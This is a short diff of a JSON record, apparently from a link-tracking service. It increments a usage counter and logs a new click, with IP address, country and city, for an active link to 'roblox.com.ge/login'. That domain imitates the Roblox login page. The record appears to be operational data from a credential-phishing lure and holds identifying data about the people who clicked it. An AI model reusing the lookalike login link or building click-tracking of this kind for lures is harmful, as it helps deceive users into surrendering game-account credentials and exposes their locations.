@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1372,
+    "useCount": 1373,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11144,6 +11144,14 @@
         "city": "Ottawa",
         "flag": "🇨🇦",
         "countryCode": "CA"
+      },
+      {
+        "timestamp": 1777421339131,
+        "ip": "157.100.202.60",
+        "country": "Ecuador",
+        "city": "Quito",
+        "flag": "🇪🇨",
+        "countryCode": "EC"
       }
     ]
   },
